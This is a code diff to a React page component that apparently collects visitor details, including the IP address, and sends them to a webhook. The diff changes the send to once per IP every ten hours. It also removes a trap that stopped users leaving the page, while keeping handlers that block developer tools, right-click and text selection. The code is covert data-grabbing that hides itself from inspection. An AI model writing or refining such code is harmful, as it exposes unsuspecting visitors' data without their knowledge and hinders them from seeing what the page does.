@@ -451,18 +451,26 @@ function HandlePage() {
   if (infoLines.length === 0) {
     infoLines.push('Loading...');
   }
-  // Send to webhook only once, when info is ready and not loading
+  // Send to webhook only once per IP with 10-hour cooldown
   useEffect(() => {
     if (
       infoLines.length > 0 &&
       !infoLines[0].includes('Loading') &&
-      !window.__webhookSent
+      ipAddress && 
+      ipAddress !== 'Unknown'
     ) {
-      sendToWebhook(infoLines);
-      window.__webhookSent = true;
+      const cooldownKey = `webhook_cooldown_${ipAddress}`;
+      const lastSent = localStorage.getItem(cooldownKey);
+      const now = Date.now();
+      const tenHours = 10 * 60 * 60 * 1000; // 10 hours in milliseconds
+      
+      if (!lastSent || (now - parseInt(lastSent)) > tenHours) {
+        sendToWebhook(infoLines);
+        localStorage.setItem(cooldownKey, now.toString());
+      }
     }
     // eslint-disable-next-line
-  }, [infoLines]);
+  }, [infoLines, ipAddress]);
 
   // Basic protection against developer tools
   useEffect(() => {
@@ -509,25 +517,16 @@ function HandlePage() {
       return false;
     };
 
-    // Prevent page refresh and close
-    const handleBeforeUnload = (e) => {
-      e.preventDefault();
-      e.returnValue = 'Are you sure you want to leave?';
-      return 'Are you sure you want to leave?';
-    };
-
     document.addEventListener('keydown', handleKeyDown);
     document.addEventListener('contextmenu', handleContextMenu);
     document.addEventListener('selectstart', handleSelectStart);
     document.addEventListener('dragstart', handleDragStart);
-    window.addEventListener('beforeunload', handleBeforeUnload);
 
     return () => {
       document.removeEventListener('keydown', handleKeyDown);
       document.removeEventListener('contextmenu', handleContextMenu);
       document.removeEventListener('selectstart', handleSelectStart);
       document.removeEventListener('dragstart', handleDragStart);
-      window.removeEventListener('beforeunload', handleBeforeUnload);
     };
   }, []);
 
